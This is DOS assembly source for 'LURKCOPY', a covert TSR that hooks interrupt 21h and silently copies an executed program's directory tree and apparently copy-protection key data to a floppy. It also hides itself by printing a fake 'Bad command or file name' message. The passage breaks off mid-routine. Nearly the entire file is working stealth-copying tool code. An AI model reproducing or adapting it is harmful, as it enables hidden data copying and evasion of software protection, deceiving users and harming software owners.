comment @
******************** LURKCOPY ***********************
LURKCOPY is a TSR. It can copy a program secretly.
It hooks following DOS calls: 4Bh(execute program),
3Ch(create file), 4Dh(get return code), BBh(return 
LURKCOPY flag), CCh(remove LURKCOPY).
When the source program is executed(4Bh), LURKCOPY
will save the program's filename and read out the 
key data for further use. When the running program
tries to create a file on the target disk, LURKCOPY
will write the key data and the source file on the
target disk. If the running program does not call
function 3Ch(create file), it should finally return
to DOS, LURKCOPY will copy key data and source file
on the target disk when 4Dh(get return code) is called.
**************************************
Written by  Black White. Apri 21,1995.
Hangzhou University Computer Centre.
TEL:(0571)8071224-2681
BP :(0571)7011888-3047
ZIP:310028
******************************************************
end of comment @

;-----------Macro definition for int_old_21h--------------
int_old_21h macro
	pushf
	call dword ptr cs:old_21h
	endm
;-----------End of Macro definition for int_old_21h-------

;-----------Structure definition for _desc----------------
_desc struc
_seg_limit  dw 0
_base_addr  db 0,0,0
_privilege  db 0
_reserved   db 0,0
_desc ends
;-----------End of Structure definition for _desc---------

;-----------Structure definition for _xms_desc------------
_xms_desc struc
_xms_bytes      dw 0,0; should be even
_xms_src_handle dw 0
_xms_src_offset dw 0,0
_xms_tgt_handle dw 0
_xms_tgt_offset dw 0,0
_xms_desc ends
;-----------End of Structure definition for _xms_desc-----

;-----------Structure definition for _dta-----------------
_dta struc
	db 15h dup(?)
_attrib db ?
_time   dw ?
_date   dw ?
_size   dd ?
_filename db 13 dup(?)
        db 100h-2bh dup(?)
_dta ends
;-----------End of Structure definition for _dta----------

code segment
assume cs:code,ds:code
org 100h
main:
	jmp init
;-----------------------Int_21h--------------------------
int_21h:
	sti
	cmp ah,3ch
	jne not_3ch
	jmp is_3ch
not_3ch:
	cmp ax,4b00h
	jne not_4bh
	jmp is_4bh
not_4bh:
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;	cmp ah,4dh   ;
;;;;;;;;;	jne not_4dh  ;
;;;;;;;;;	jmp is_4dh   ;
;;;;;;;;;       not_4dh:     ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	cmp ax,0bbbbh
	jne not_bbh
	jmp is_bbh
not_bbh:
	cmp ax,0cccch
	jne not_cch
	jmp is_cch
not_cch:
	jmp to_old_21h
;-------Int_21h_3ch_4dh----------
is_3ch:
is_4dh:
	push ax
	push bx
	push cx
	push dx
	push bp
	push si
	push di
	push ds
	push es
	cmp ah,4dh
	je is_4dh_is_the_file
	mov si,dx
	mov al,ds:[si]
	and al,not 20h
	cmp al,cs:c_drive1
	je  is_3ch_is_the_file
	jmp not_the_file
is_3ch_is_the_file:
is_4dh_is_the_file:
	push cs
	pop  ds; DS=CS
	push cs
	pop  es; ES=CS
check_copy_flag:
	cmp copy_flag,1
	je copy_flag_ok
	jmp not_the_file
copy_flag_ok:
to_copy_file:
	call copy_file
	mov copy_flag,0
	jmp not_the_file
;-------End of Int_21h_3ch_4dh-------
;
;-------Int_21h_4bh------------------
is_4bh:
	push ax
	push bx
	push cx
	push dx
	push bp
	push si
	push di
	push ds
	push es
	mov si,dx
	mov al,ds:[si]
	and al,not 20h
	mov cs:c_drive0,al
	mov cs:src_path[0],al
	mov cs:src_path[1],':'
	mov cs:src_path[2],'\'
	sub al,'A'
	mov cs:drive0,al
	mov dl,al
	inc dl
	push cs
	pop  ds
	lea si, src_path[3]
	mov ah,47h
	int 21h
	push cs
	pop  es
	lea di, src_path[3]
	mov cx,0ffffh
	xor al,al
	cld
	repnz scasb
	mov byte ptr es:[di-1],'\'
	mov byte ptr es:[di],00h
	;
	mov cs:copy_flag,1
	;
	jmp not_the_file
not_the_file:
	pop  es
	pop  ds
	pop  di
	pop  si
	pop  bp
	pop  dx
	pop  cx
	pop  bx
	pop  ax
	jmp  to_old_21h
;-------End of Int_21h_4bh-------------
;
;-------Int_21h_bbh--------------------
is_bbh:
	mov ax,0cccch
	iret
;-------End of Int_21h_bbh-------------
;
;-------Int_21h_cch--------------------
is_cch:
	push ds
	push dx
	lds  dx, dword ptr cs:old_21h
	mov ax,2521h
	int_old_21h  ; reset int_21h
	pop  dx
	pop  ds
	push es
	  push cs
	  pop  es
	  mov  ah,49h
	  int  21h   ; release memory
	pop  es
	mov al,cs:mem_flag
	cmp al,'X'
	je  release_xms_handle
	cmp al,'E'
	je  release_ems_handle
	jmp is_cch_iret
release_xms_handle:
	push dx
	mov ah,0ah
	mov dx,cs:xms_handle
	call dword ptr cs:xms
	pop dx
	jmp is_cch_iret
release_ems_handle:
	push dx
	mov ah,45h
	mov dx,cs:ems_handle
	int 67h
	pop  dx
is_cch_iret:
	mov ax,0bbbbh
	iret
;-------End of Int_21h_cch------------
;
;-------Copy_file---------------------
old_dta dw 0,0
old_24h dw 0,0
int_24h:
	mov al,3
	iret
copy_file proc near
	push es
	mov ax,3524h
	int_old_21h
	mov old_24h,bx
	mov old_24h[2],es; save int_24h
	mov ah,2fh
	int_old_21h
	mov old_dta,bx
	mov old_dta[2],es; save old dta address
	pop  es
	mov ax,2524h
	mov dx,offset int_24h
	int_old_21h; set int_24h
	mov ah,1ah
	mov dx,offset dta
	int_old_21h; set dta address
;save ems map
	cmp mem_flag,'E'
	jne to_init_para
	mov ah,47h
	int 67h   ; save EMS mapping context
to_init_para:
	call init_para; set path, path_len, cur_path, cur_path_len
		      ; according to src_path
check_idx_file:
	mov ah,4eh; find first 'A:\BW\BW.IDX'
	mov cx,37h
	mov dx,offset idx_file
	int_old_21h
	jc  do_copy_file_begin; if cannot find BW.IDX===>do_copy_file_begin
	jmp do_copy_file_end  ; if find BW.IDX===>do_copy_file_end
do_copy_file_begin:
do_copy_file:
	call get_image   ; Copy all source files to memory(image for BW.DBF),or
			 ; hard_disk(C:\BW.DBF), or floppy disk(A:\BW\BW.DBF).
			 ; Create BW.IDX in memory. Close files.
	call put_image   ; copy image to floppy disk
do_copy_file_end:
	push ds
	mov ah,1ah
	lds dx,dword ptr cs:old_dta
	int_old_21h      ; reset dta address
	mov ax,2524h
	lds dx,dword ptr cs:old_24h
	int_old_21h
	pop  ds
;restore ems map
	cmp mem_flag,'E'
	jne copy_file_ret
	mov ah,48h
	int 67h   ; restore EMS mapping context
copy_file_ret:
	ret
copy_file endp
;-------End of Copy_file--------------------

;-------Put_image-------------------------
;Put image saved on memory or hard disk to 
;floppy disk.
put_image proc near
create_idx:
	mov ah,3ch
	xor cx,cx
	mov dx,offset idx_file
	int_old_21h
	mov idx_handle,ax
	mov bx,ax
	mov ah,40h
	mov cx,idx_ptr
	xor dx,dx
	push ds
	    mov ds,cs:idx_seg
	    int_old_21h
	pop  ds
	mov ah,3eh
	int_old_21h
;write image from memory or hard disk to floppy disk
	mov ax,dbf_ptr[0]
	mov dx,dbf_ptr[2]
	mov file0_len[0],ax
	mov file0_len[2],dx
	mov dbf_ptr[0],0
	mov dbf_ptr[2],0
	mov ems_frame_offset,0
	mov ems_page_ptr,0
;
	mov al,mem_flag
	cmp al,'F'
	jne create_dbf
	jmp put_image_ret; If Floppy_disk===>put_image_ret
create_dbf:
	push ax
	mov ah,3ch
	xor cx,cx
	mov dx,offset dbf_file
	int_old_21h
	mov dbf_handle,ax
	pop  ax
	cmp al,'H'
	jne put_image_pre_ems?
open_h_dbf:
	mov ax,3d00h
	mov dx,offset h_dbf_file
	int_old_21h
	mov h_dbf_handle,ax
	jmp read_image_again
put_image_pre_ems?:
	cmp al,'E'
	je put_image_pre_ems
	jmp read_image_again
put_image_pre_ems:
	mov al,0; physical page number
	mov bx,0; logical page number
	mov cx,4
	mov dx,ems_handle
put_image_pre_ems_switch_pages:
	mov ah,44h
	int 67h
	inc al
	inc bx
	loop put_image_pre_ems_switch_pages
	add ems_page_ptr,4
	jmp read_image_again		
;
read_image_again:
	mov cx,0fff0h
	cmp file0_len[2],0
	je  image_end?
image_not_end:
	sub file0_len[0],cx
	sbb file0_len[2],0
	jmp read_image
image_end?:
	cmp file0_len[0],cx
	jae image_not_end
	mov cx,file0_len[0]
	jcxz image_end
	jmp image_not_end
image_end:
	jmp put_image_end
read_image:
	mov al,mem_flag
read_x?:
	cmp al,'X'
	jne read_e?
	call read_xms
	jmp write_image
read_e?:
	cmp al,'E'
	jne read_i?
	call read_ems
	jmp write_image
read_i?:
	cmp al,'I'
	jne read_h?
	call read_int
	jmp write_image
read_h?:
	call read_hard
	jmp write_image
write_image:
	mov ah,40h
	mov bx,dbf_handle
	xor dx,dx
	push ds
	    mov ds,free_seg
	    int_old_21h
	pop  ds
	jmp read_image_again
put_image_end:
	mov ah,3eh
	mov bx,dbf_handle
	int_old_21h
	cmp mem_flag,'H'
	jne put_image_ret
del_h_dbf:
	mov ah,3eh
	mov bx,h_dbf_handle
	int_old_21h
	mov ah,41h
	mov dx,offset h_dbf_file
	int_old_21h
put_image_ret:	
	ret
put_image endp
;-------End of Put_image------------------

;-------Get_a_file---------------------------
;copy a file to Xms/Ems/Int_15h/Hard_disk/Floppy_disk
;record idx: 'path\filename',0,offset(LSW),offset(MSW),len(LSW),len(MSW)
;set idx_ptr, dbf_ptr
get_a_file proc near
open_file0:
	mov ax,3d00h
	mov dx,offset cur_filename
	int_old_21h; open source file(running program)
	mov cs:handle0,ax
	mov bx,ax
	mov ax,4202h
	xor cx,cx
	xor dx,dx
	int_old_21h; get source file's len
	push ax
	push dx
	mov ax,4200h
	xor cx,cx
	xor dx,dx
	int_old_21h
	pop  dx
	pop  ax
	mov cs:file0_len[0],ax
	mov cs:file0_len[2],dx; save source file's len
	;
	push es
	mov di,offset cur_filename
	mov cx,0ffffh
	mov al,0
	repnz scasb
	not cx; CX=len of cur_filename(include '\0')
	push cx
	mov si,offset cur_filename
	mov di,idx_ptr
	mov es,idx_seg
	rep movsb
	pop  cx
	add idx_ptr,cx
	mov ax,dbf_ptr[0]
	mov dx,dbf_ptr[2]
	mov es:[di],ax
	mov es:[di+2],dx
	mov ax,file0_len[0]
	mov dx,file0_len[2]
	mov es:[di+4],ax
	mov es:[di+6],dx
	add idx_ptr,8
	pop es
	;
read_file0_again:
	mov cx,0fff0h
	cmp file0_len[2],0
	je  file0_end?
file0_not_end:
	sub file0_len[0],cx
	sbb file0_len[2],0
	jmp read_file0
file0_end?:
	cmp file0_len[0],cx
	jae file0_not_end
	mov cx,file0_len[0]
	jcxz file0_end
	jmp file0_not_end
file0_end:
	jmp copy_file_end
read_file0:
	mov ah,3fh
	mov bx,handle0
	xor dx,dx
	push ds
	    mov ds,free_seg
	    int_old_21h
	pop  ds
read_file0_ok:
	mov al,mem_flag
write_x?:
	cmp al,'X'
	jne write_e?
	call write_xms
	jmp read_file0_again
write_e?:
	cmp al,'E'
	jne write_i?
	call write_ems
	jmp read_file0_again
write_i?:
	cmp al,'I'
	jne write_h?
	call write_int
	jmp read_file0_again
write_h?:
	cmp al,'H'
	jne write_f?
	call write_hard
	jmp read_file0_again
write_f?:
	call write_floppy
	jmp read_file0_again
copy_file_end:
	mov ah,3eh
	mov bx,handle0
	int_old_21h
	ret
get_a_file endp	
;-------End of Get_a_file--------------

;-------Write_floppy---------------
;Input: CX=bytes to write
write_floppy proc near
	mov ah,40h
	mov bx,dbf_handle
	xor dx,dx
	push ds
	    mov ds,free_seg
	    int_old_21h
	pop  ds
	add dbf_ptr,cx
	adc dbf_ptr[2],0
	ret
write_floppy endp
;------End of Write_floppy---------

;-------Read_hard----------------
;Input: CX=bytes to read
read_hard proc near
	mov ah,3fh
	mov bx,h_dbf_handle
	xor dx,dx
	push ds
	    mov ds,free_seg
	    int_old_21h
	pop  ds
	add dbf_ptr,cx
	adc dbf_ptr[2],0
	ret
read_hard endp
;-------End of Read_hard---------

;-------Write_hard---------------
;Input: CX=bytes to write
write_hard proc near
	mov ah,40h
	mov bx,h_dbf_handle
	xor dx,dx
	push ds
	    mov ds,free_seg
	    int_old_21h
	pop  ds
	add dbf_ptr,cx
	adc dbf_ptr[2],0
	ret
write_hard endp
;------End of Write_hard---------

;------Read_xms------------------
;Input: CX=bytes to read
read_xms proc near
	push cx
	inc cx
	and cx,not 1
	mov xms_desc._xms_bytes,cx
	mov xms_desc._xms_bytes[2],0
	mov xms_desc._xms_tgt_handle,0
	mov xms_desc._xms_tgt_offset,0
	mov ax,free_seg
	mov xms_desc._xms_tgt_offset[2],ax
	mov ax,xms_handle
	mov xms_desc._xms_src_handle,ax
	mov ax,dbf_ptr[0]
	mov dx,dbf_ptr[2]
	mov xms_desc._xms_src_offset,ax
	mov xms_desc._xms_src_offset[2],dx
	mov ah,0bh
	mov si,offset xms_desc
	call dword ptr cs:xms
	pop  cx
	add dbf_ptr,cx
	adc dbf_ptr[2],0
	ret
read_xms endp
;------End of Read_xms-----------

;------Write_xms-----------------
;Input: CX=bytes to write
write_xms proc near
	push cx
	inc cx
	and cx,not 1
	mov xms_desc._xms_bytes,cx
	mov xms_desc._xms_bytes[2],0
	mov xms_desc._xms_src_handle,0
	mov xms_desc._xms_src_offset,0
	mov ax,free_seg
	mov xms_desc._xms_src_offset[2],ax
	mov ax,xms_handle
	mov xms_desc._xms_tgt_handle,ax
	mov ax,dbf_ptr[0]
	mov dx,dbf_ptr[2]
	mov xms_desc._xms_tgt_offset,ax
	mov xms_desc._xms_tgt_offset[2],dx
	mov ah,0bh
	mov si,offset xms_desc
	call dword ptr cs:xms
	pop  cx
	add dbf_ptr,cx
	adc dbf_ptr[2],0
	ret
write_xms endp
;------End of Write_xms----------

;------Read_ems------------------
;Input: CX=bytes to read
read_ems proc near
	push cx
	mov ax,ems_frame_offset
	neg ax; AX=bytes available in the frame
	jnz enough_frame_r?
	jmp enough_frame_r
enough_frame_r?:
	cmp cx,ax
	jae not_enough_frame_r
	jmp enough_frame_r
not_enough_frame_r:
	push cx
	mov cx,ax
	push cx
	push ds
	push es
	mov si,ems_frame_offset
	xor di,di
	mov es,free_seg
	mov ds,ems_seg
	rep movsb
	pop  es
	pop  ds
	pop  cx
	add dbf_ptr,cx
	adc dbf_ptr[2],0
	push cx
	mov cx,4
	mov al,0
	mov bx,ems_page_ptr
read_ems_switch_pages:
	mov ah,44h
	mov dx,ems_handle
	int 67h
	inc al
	inc bx
	loop read_ems_switch_pages
	pop  ax; bytes read
	add ems_page_ptr,4
	pop  cx; bytes to read
	sub cx,ax; bytes left
	push cx
	push ds
	push es
	xor si,si
	mov es,free_seg
	mov ds,ems_seg
	rep movsb
	pop  es
	pop  ds
	pop  cx
	mov ems_frame_offset,si
	add dbf_ptr,cx
	adc dbf_ptr[0],0
	jmp read_ems_ret
enough_frame_r:
	push cx
	push ds
	push es
	mov si,ems_frame_offset
	xor di,di
	mov es,free_seg
	mov ds,ems_seg
	rep movsb
	pop  es
	pop  ds
	pop  cx
	mov ems_frame_offset,si
	add dbf_ptr,cx
	adc dbf_ptr[2],0
read_ems_ret:
	pop cx; CX=total bytes read out
	ret	
read_ems endp
;------End of Read_ems-----------

;------Write_ems-----------------
;Input: CX=bytes to write
write_ems proc near
	push cx
	mov ax,ems_frame_offset
	neg ax; AX=bytes available in the frame
	jnz enough_frame?
	jmp enough_frame
enough_frame?:
	cmp cx,ax
	jae not_enough_frame
	jmp enough_frame
not_enough_frame:
	push cx
	mov cx,ax
	push cx
	push ds
	push es
	xor si,si
	mov di,ems_frame_offset
	mov es,ems_seg
	mov ds,free_seg
	rep movsb
	pop  es
	pop  ds
	pop  cx
	add dbf_ptr,cx
	adc dbf_ptr[2],0
	push cx
	mov cx,4
	mov al,0
	mov bx,ems_page_ptr
write_ems_switch_pages:
	mov ah,44h
	mov dx,ems_handle
	int 67h
	inc al
	inc bx
	loop write_ems_switch_pages
	pop  ax; bytes written
	add ems_page_ptr,4
	pop  cx; bytes to write
	sub cx,ax; bytes left
	push cx
	push ds
	push es
	xor di,di
	mov es,ems_seg
	mov ds,free_seg
	rep movsb
	pop  es
	pop  ds
	pop  cx
	mov ems_frame_offset,di
	add dbf_ptr,cx
	adc dbf_ptr[0],0
	jmp write_ems_ret
enough_frame:
	push cx
	push ds
	push es
	xor si,si
	mov di,ems_frame_offset
	mov es,ems_seg
	mov ds,free_seg
	rep movsb
	pop  es
	pop  ds
	pop  cx
	mov ems_frame_offset,di
	add dbf_ptr,cx
	adc dbf_ptr[2],0
write_ems_ret:
	pop cx; CX=total bytes written
	ret	
write_ems endp
;------End of Write_ems----------

;------Mk_32_addr----------------
;Input: DX=seg, AX=off
;Output: DX:AX=32-bit linear addr
mk_32_addr proc near
	push bx
	push cx
	mov bx,dx
	mov cl,12
	shr bx,cl
	mov cl,4
	shl dx,cl
	add ax,dx
	adc bx,0
	mov dx,bx
	pop  cx
	pop  bx
	ret
mk_32_addr endp
;------End of Mk_32_addr---------

;------Read_int------------------
;Input: CX=bytes to read
read_int proc near
	push cx
	inc cx
	shr cx,1; CX=words to read
	mov tgt_desc._seg_limit,0ffffh
	mov dx,free_seg
	xor ax,ax
	call mk_32_addr
	mov tgt_desc._base_addr[0],al
	mov tgt_desc._base_addr[1],ah
	mov tgt_desc._base_addr[2],dl
	mov tgt_desc._privilege,93h
	mov tgt_desc._reserved[0],0
	mov tgt_desc._reserved[1],0
	mov ax,dbf_ptr[0]
	mov dx,dbf_ptr[2]
	add dx,10h; above +1M
	mov src_desc._seg_limit,0ffffh
	mov src_desc._base_addr[0],al
	mov src_desc._base_addr[1],ah
	mov src_desc._base_addr[2],dl
	mov src_desc._privilege,93h
	mov src_desc._reserved[0],0
	mov src_desc._reserved[1],0
	mov ah,87h
	mov si,offset gdt; ES:SI--->gdt
	int 15h
	pop cx
	add dbf_ptr,cx
	adc dbf_ptr[2],0
	ret	
read_int endp
;------End of Read_int-----------

;------Write_int-----------------
;Input: CX=bytes to write
write_int proc near
	push cx
	inc cx
	shr cx,1; CX=words to write
	mov src_desc._seg_limit,0ffffh
	mov dx,free_seg
	xor ax,ax
	call mk_32_addr
	mov src_desc._base_addr[0],al
	mov src_desc._base_addr[1],ah
	mov src_desc._base_addr[2],dl
	mov src_desc._privilege,93h
	mov src_desc._reserved[0],0
	mov src_desc._reserved[1],0
	mov ax,dbf_ptr[0]
	mov dx,dbf_ptr[2]
	add dx,10h; above +1M
	mov tgt_desc._seg_limit,0ffffh
	mov tgt_desc._base_addr[0],al
	mov tgt_desc._base_addr[1],ah
	mov tgt_desc._base_addr[2],dl
	mov tgt_desc._privilege,93h
	mov tgt_desc._reserved[0],0
	mov tgt_desc._reserved[1],0
	mov ah,87h
	mov si,offset gdt; ES:SI--->gdt
	int 15h
	pop cx
	add dbf_ptr,cx
	adc dbf_ptr[2],0
	ret	
write_int endp
;------End of Write_int----------


;-------Find_first_next------------
first_flag db 0
found_flag db 0
find_first_next proc near
	cmp first_flag,1
	jne find_next
find_first:
	call create_tmp_filename
	mov ah,4eh
	mov dx,offset tmp_filename
	mov cx,37h; CX=search attribute
	int_old_21h
	jc  first_not_found
	cmp dta._filename,'.'
	jne first_found
	mov first_flag,0
	jmp find_next
first_found:
	mov first_flag,0
	mov found_flag,1
	jmp find_first_next_ret
first_not_found:
next_not_found:
	mov found_flag,0
	jmp find_first_next_ret
find_next:
	mov ah,4fh
	int_old_21h
	jc  next_not_found
	cmp dta._filename,'.'
	je  find_next
second_found:
	mov first_flag,0
	mov found_flag,1
find_first_next_ret:
	ret
find_first_next endp	
;-------End of Find_first_next-----

;-------Find_dir_first_next--------
find_dir_first_next proc near
	cmp first_flag,1
	jne dir_find_next
dir_find_first:
	call create_dir_tmp_filename
	mov ah,4eh
	mov dx,offset tmp_filename
	mov cx,17h; CX=search attribute
	int_old_21h
	jc  dir_first_not_found
	cmp dta._filename,'.'
	jne dir_first_found
	mov first_flag,0
	jmp dir_find_next
dir_first_found:
	mov first_flag,0
	mov found_flag,1
	jmp find_dir_first_next_ret
dir_first_not_found:
dir_next_not_found:
	mov found_flag,0
	jmp find_dir_first_next_ret
dir_find_next:
	mov ah,4fh
	int_old_21h
	jc  dir_next_not_found
	cmp dta._filename,'.'
	je  dir_find_next
dir_second_found:
	mov first_flag,0
	mov found_flag,1
find_dir_first_next_ret:
	ret
find_dir_first_next endp	
;-------End of Find_dir_first_next-

;-------Create_tmp_filename--------
create_tmp_filename proc near
	mov si,offset cur_path
	mov di,offset tmp_filename
	mov cx,cur_path_len
	rep movsb
	mov si,offset filename
	mov cx,filename_len
	rep movsb
	mov al,0
	stosb
	ret
create_tmp_filename endp
;-------End of Create_tmp_filename-

;-------Create_dir_tmp_filename--------
create_dir_tmp_filename proc near
	mov si,offset cur_path
	mov di,offset tmp_filename
	mov cx,cur_path_len
	rep movsb
	mov al,'?'
	mov cx,8
	rep stosb
	mov al,'.'
	stosb
	mov al,'?'
	mov cx,3
	rep stosb
	mov al,0
	stosb
	ret
create_dir_tmp_filename endp
;-------End of Create_dir_tmp_filename-

;-------Create_cur_filename------------
create_cur_filename proc near
	mov si,offset cur_path
	mov di,offset cur_filename
	mov cx,cur_path_len
	rep movsb
	push di
	lea si,dta._filename
	mov di,si
	mov al,0
	mov cx,0ffffh
	repnz scasb
	not cx; CX=filename len+1('\0')
	pop  di
	rep movsb
	ret
create_cur_filename endp
;-------End of Create_cur_filename-----

;-------Add_cur_path------------
add_cur_path proc near
	lea di,dta._filename
	mov si,di
	mov cx,0ffffh
	mov al,0
	repnz scasb
	inc cx
	not cx
	mov di,offset cur_path
	add di,cur_path_len
	add cur_path_len,cx
	rep movsb
	mov al,'\'
	stosb
	inc cur_path_len
	mov al,0
	stosb
	ret
add_cur_path endp
;-------End of Add_cur_path-----

;-------Sub_cur_path------------
sub_cur_path proc near
	mov di,offset cur_path
	mov cx,cur_path_len
	add di,cx
	dec di; DI--->'\'
	mov al,'\'
	std
	repnz scasb
	repnz scasb
	cld
	mov cur_path_len,cx
	inc di
	mov al,'\'
	stosb
	inc cur_path_len
	mov al,0
	stosb
	ret
sub_cur_path endp
;-------End of Sub_cur_path-----

;-------Get_image---------------------
scale db 0
dta   _dta <>
get_image proc near
	mov file0_len[0],0
	mov file0_len[2],0
	mov dbf_ptr[0],0
	mov dbf_ptr[2],0
	mov idx_ptr,0
	mov ems_frame_offset,0
	mov ems_page_ptr,0
	push es
	mov es,idx_seg
	mov byte ptr es:[0000h],1ah
	pop  es
	inc idx_ptr
hard_disk?:
	cmp mem_flag,'H'
	jne floppy_disk?
create_h_dbf:
	mov ah,3ch
	xor cx,cx
	mov dx,offset h_dbf_file
	int_old_21h
	mov h_dbf_handle,ax
	jmp search_path
floppy_disk?:
	cmp mem_flag,'F'
	jne get_image_pre_ems?
create_f_dbf:
	mov ah,3ch
	xor cx,cx
	mov dx,offset dbf_file
	int_old_21h
	mov dbf_handle,ax
	jmp search_path
get_image_pre_ems?:
	cmp mem_flag,'E'
	je get_image_pre_ems
	jmp search_path
get_image_pre_ems:
	mov al,0; physical page number
	mov bx,0; logical page number
	mov cx,4
	mov dx,ems_handle
get_image_pre_ems_switch_pages:
	mov ah,44h
	int 67h
	inc al
	inc bx
	loop get_image_pre_ems_switch_pages
	add ems_page_ptr,4
	jmp search_path
search_path:
	mov scale,0
	mov first_flag,1
	mov found_flag,0
search_path_again:
	call find_first_next
	cmp  found_flag,1
	jne  not_found
found:
	test dta._attrib,10h
	jnz  is_sub_dir
is_file:	
	call create_cur_filename
	call get_a_file
	jmp search_path_again
is_sub_dir:
push_dta:
	sub sp,15h
	mov di,sp
	lea si,dta
	push es
	   push ss
	   pop  es
	   mov cx,15h
	   rep movsb
	pop  es
	inc scale
	mov first_flag,1
	mov found_flag,0
	call add_cur_path
	jmp search_path_again
not_found:
is_scale_0?:	
	cmp scale,0
	jne goto_pre_dir
	clc
	jmp search_end
goto_pre_dir:
pop_dta:
	mov si,sp
	lea di,dta
	mov cx,15h
	push ds
	   push ss
	   pop  ds
	   rep movsb
	pop  ds
	add sp,15h
	dec scale
	call sub_cur_path
	mov first_flag,0
	mov found_flag,0
	jmp search_path_again
search_end:
close_h_dbf?:
	cmp mem_flag,'H'
	jne close_f_dbf?
	mov ah,3eh
	mov bx,h_dbf_handle
	int_old_21h
	jmp get_image_ret
close_f_dbf?:
	cmp mem_flag,'F'
	jne get_image_ret
	mov ah,3eh
	mov bx,dbf_handle
	int_old_21h
get_image_ret:
	ret
get_image endp
;-------End of Get_image--------------

;-------Init_para-------------------
;Set path,path_len,cur_path,cur_path_len,
;filename,filename_len according to src_path.
init_para proc near
	mov di,offset src_path
	mov cx,0ffffh
	mov al,0
	repnz scasb
	inc cx
	not cx; CX=len of original path
	mov path_len,cx          ; set path_len
	mov si,offset src_path
	mov di,offset path
para_is_root_path:
	push si
	push cx
	rep movsb
	mov al,0
	stosb                 ; set path
	pop  cx
	pop  si
	mov cur_path_len,cx   ; set cur_path_len
	mov di,offset cur_path; set cur_path
	rep movsb
	mov al,0
	stosb
set_filename:
	mov di,offset filename
	mov al,'?'
	mov cx,8
	rep stosb
	mov al,'.'
	stosb
	mov al,'?'
	mov cx,3
	rep stosb
	mov al,0
	stosb    ; end the original filename with '\0'
	mov filename_len,12
	clc
	jmp init_para_ret
init_para_ret:
	ret
init_para endp
;-------End of Init_para--------

;-------Data definition for int_21h---------
;[*]
to_old_21h:
jmp_far	         db 0eah
old_21h          dw 0,0 ; int_21h's vector
xms              dw 0,0 ; entry for XMS
idx_seg          dw 0
idx_ptr          dw 0
free_seg         dw 0
dbf_ptr          dw 0,0
ems_page_ptr     dw 0; first available page number
ems_frame_offset dw 0; available offset in the frame
ems_seg          dw 0
;
space      equ ' '
tab        equ 9
least_xms  =500h ; (k)(1.2M)
least_ems  =50h  ; (pages)(1.2M)
least_15h  =500h ; (k)(1.2M)
least_hard =0a00h; (sectors)(1.2M)
N          db 0
copy_flag  db 0
mem_flag   db 0; Xms/Ems/Int_15h/Hard_disk/Floppy_disk
ems_flag   db 'EMMXXXX0',0
;
tmp_path     label byte
tmp_filename label byte
para         label byte
             db 80h dup(0)
path_len     dw 0
path         db 65 dup(0)
filename_len dw 0
filename     db 13 dup(0)  ; original filename
cur_path_len dw 0
cur_path     db 65  dup(0)
cur_filename_len  dw 0
cur_filename      db 80h dup(0)
;
drive0         db 0
drive1 	       db 0
c_drive0       db 0
c_drive1       db 0
src_path       db '?:\BITLOK3',0,64 dup(0)
key_file       db '?:\BW\'
key_file_count db '1.key',0
idx_file       db '?:\BW\BW.IDX',0
dbf_file       db '?:\BW\BW.DBF',0
h_dbf_file     db 'C:\BW.DBF',0
h_dbf_handle   dw 0
idx_handle     dw 0
dbf_handle     dw 0
handle0        dw 0
handle1        dw 0
file0_len      dw 0,0
xms_handle     dw 0
ems_handle     dw 0
;
gdt label byte
null_desc _desc <>
	  _desc <>
src_desc  _desc <>
tgt_desc  _desc <>
	  _desc <>
	  _desc <>
xms_desc _xms_desc <>
;
;-------End of Data definition for int_21h---
;-------------------End of Int_21h-------------------------

;лллллллллллллллллллллллллллллллллллллллллллл;
;------------------Init----------------------
init:
	cli
	mov sp,offset stack_end; move stack to a safe place
	sti
	mov ax,0bbbbh
	int 21h	     ; check LURKCOPY
	cmp ax,0cccch; if LURKCOPY not resident in memory...
	jne install  ; ===>install
;if LURKCOPY resident in memory
uninstall:
	mov ax,0cccch
	int 21h			 ; uninstall LURKCOPY
	push es			 ; 
	mov ax,0040h
	mov es,ax
	mov bx,0017h
	mov al,es:[bx]
	and al,not 10h
	mov es:[bx],al
	pop  es	      ;turn off scroll_lock
;
	mov ah,9
	mov dx,offset bad_cmd_msg
	int 21h			 ; display fraudulent message
	mov ax,4c00h
	int 21h       		 ; exit to DOS
bad_cmd_msg db 'Bad command or file name',0dh,0ah,'$'
install:
	push es
	push bx
	mov ax,3521h
	int 21h		 ; save int_21h's vector
	mov old_21h[0],bx
	mov old_21h[2],es
	pop  bx
	pop  es
	mov ah,19h
	int 21h	     ; get current drive(also target drive)
	mov drive1,al; set target drive number(0 for A:, 1 for B:)
	mov ah,al
	add al,'A'
	mov c_drive1,al; set target drive's name
	mov key_file,al; set drive name for key_file
	mov idx_file,al; set drive name for idx_file
	mov dbf_file,al; set drive name for dbf_file
	mov al,ah
	xor al,1       ; AL=source drive number
;
	mov al,2
	mov drive0,al  ; set source drive number
	add al,'A'
	mov c_drive0,al; set source drive name
	mov src_path,al; set source drive name for para
;check Xms,Ems,Int_15h,Hard_disk,Floppy_disk
	mov mem_flag,0
	mov ax,4300h
	int 2fh     ; check XMS
	cmp al,80h
	je  has_xms
	jmp no_xms
has_xms:
	push es
	mov ax,4310h
	int 2fh
	mov xms[0],bx
	mov xms[2],es; get XMS's entry
	pop  es
	mov ah,8
	call dword ptr cs:xms; get the largest xms block--->AX
	cmp ax,least_xms
	jb  no_xms
	mov ah,9
	mov dx,least_xms
	call dword ptr cs:xms; allocate xms
	cmp ax,1
	jne no_xms
	mov xms_handle,dx
	mov mem_flag,'X'
	jmp check_mem_ok
no_xms:
	push es
	mov ax,3567h
	int 21h     ; get int_67h's vector--->ES:BX
	mov di,000ah; ES:DI--->'EMMXXXX0'
	mov si,offset ems_flag
	mov cx,8
	cld
	repz cmpsb
	pop  es
	jnz no_ems
has_ems:
	mov ah,41h
	int 67h   ; get ems frame segment
	cmp ah,0
	jne no_ems
	mov ems_seg,bx
	mov ah,42h
	int 67h   ; get free ems pages--->BX
	cmp ah,0
	jne no_ems
	cmp bx,least_ems
	jb  no_ems
	mov ah,43h
	mov bx,least_ems
	int 67h   ; allocate ems pages
	cmp ah,0
	jne no_ems
	mov ems_handle,dx
	mov mem_flag,'E'
	jmp check_mem_ok
no_ems:
	mov ah,88h
	int 15h
	cmp ax,least_15h
	jb  no_15h
	mov mem_flag,'I'
	jmp check_mem_ok
no_15h:
	mov ah,36h
	mov dl,3  ; C:
	int 21h   ; get disk space
		  ; AX=0ffffh if invalid drive
		  ;   =sectors per cluster
		  ; BX=available clusters
